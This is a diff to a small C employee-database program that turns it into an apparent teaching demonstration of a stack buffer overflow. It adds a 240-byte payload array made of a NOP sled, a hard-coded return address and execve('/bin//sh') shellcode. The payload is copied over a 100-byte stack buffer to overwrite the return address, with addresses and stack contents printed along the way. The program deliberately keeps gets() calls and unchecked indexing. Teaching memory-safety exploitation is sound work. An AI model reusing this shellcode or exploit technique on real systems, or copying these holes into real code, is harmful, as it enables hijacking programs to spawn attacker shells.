@@ -5,37 +5,123 @@
  */
 
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
+#include <ctype.h>
+
+char attack[240] = {
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x40, 0xcf, 0xff, 0xff, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+	0x90, 0x90, 0x90, 0x90, 0x90, 0x31, 0xc0, 0x50,
+	0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62,
+	0x69, 0x6e, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1,
+	0x31, 0xd2, 0x31, 0xc0, 0xb0, 0x0b, 0xcd, 0x80
+};
+//0xed, 0x65, 0x55, 0x56,
 
 struct Employee {
-	char name[50];
+	char name[48];
 	int id;
-	int time_in;
-	int time_out;
+	int hours_worked;
 };
 
-int add_new_employee(struct Employee *database, int employee_count);
+void add_new_employee(struct Employee *database, int employee_count,
+			int stack, char* attack);
+void bof(char *attack);
+int add_employee_hours(struct Employee *database);
 
-int add_new_employee(struct Employee *database, int employee_count) {
+void add_new_employee(struct Employee *database, int employee_count,
+			int stack, char* attack)
+{
 	char name_input[100];
 
 	printf("enter employee name: ");
 	gets(name_input);
+
+	printf("ret addr: %p\n", __builtin_return_address(0));
+	printf("frame addr: %p\n", __builtin_frame_address(0));
+	printf("buffer[0] addr: %p\n", &name_input[0]);
+	printf("buffer[99] addr: %p\n", &name_input[99]);
+	printf("database addr: %p\n", &database);
+	printf("employee addr: %p\n", &employee_count);
+	printf("attack addr: %p\n", &attack);
+
+	if (stack) {
+		for (int i = 239; i>=0; i--) {
+			printf("@%p: %2x (%c)\n",
+				&name_input[i], name_input[i],
+				(isgraph(name_input[i]) ? name_input[i] : ' ' ));
+		}
+		strncpy(name_input, attack, 240);
+		printf("ret addr: %p\n", __builtin_return_address(0));
+		for (int i = 239; i>=0; i--) {
+			printf("@%p: %2x (%c)\n",
+				&name_input[i], name_input[i],
+				(isgraph(name_input[i]) ? name_input[i] : ' ' ));
+		}
+	} else {
+		database[employee_count].id = employee_count+1;
+		database[employee_count].hours_worked = 0;
+		strcpy(database[employee_count].name, name_input);
+	}
+
+
 	printf("welcome to work, %s! :3\n", name_input);
 	
-	database[employee_count].id = employee_count+1;
-	strcpy(database[employee_count].name, name_input);
+	return;	
+}
+
+int add_employee_hours(struct Employee *database) {
+	char id_input[10];
+	char hours_input[10];
+
+	printf("enter employee id: ");
+	gets(id_input);
+
+	printf("how many hours today?: ");
+	gets(hours_input);
+	
+	database[atoi(id_input)-1].hours_worked += atoi(hours_input);
+	printf("total hours for %s: %d\n",
+		database[atoi(id_input)-1].name,
+		database[atoi(id_input)-1].hours_worked);
 
 	return 0;	
 }
 
 int main(void) {
 	int i;
-	int count = 0;
-	struct Employee database[5];
+	int count;
+	struct Employee database[10];
+	printf("main ret addr: %p\n", __builtin_return_address(0));
 
+	count = 0;
 	while (count < 3) {
-		add_new_employee(database, count);
+		add_new_employee(database, count, 0, attack);
 		count += 1;
 	}
 
@@ -43,6 +129,31 @@ int main(void) {
 	for (i = 0; i<3; ++i) {
 		printf("%d: %s\n", database[i].id, database[i].name);
 	}
+
+	printf("\n --- Time to enter hours :) ---\n");
+	for (i = 0; i<3; i++) {
+		add_employee_hours(database);
+	}
+
+	printf(
+		"\n\nvoid add_new_employee(struct Employee *database, int employee_count)\n"
+		"{\n"
+			"\tchar name_input[100];\n\n"
+
+			"\tprintf(\"enter employee name: \");\n"
+			"\tgets(name_input);     <---------------------------- VERY BAD\n\n"
+
+			"\tdatabase[employee_count].id = employee_count+1;\n"
+			"\tdatabase[employee_count].hours_worked = 0;\n"
+			"\tstrcpy(database[employee_count].name, name_input);\n\n"
+
+			"\tprintf(\"welcome to work, \\%%s! :3\\n\", name_input);\n\n"
+			
+			"\treturn;\n"
+		"}\n\n"
+	);
+
+	add_new_employee(database, count, 1, attack);
 
 	return 0;
 }
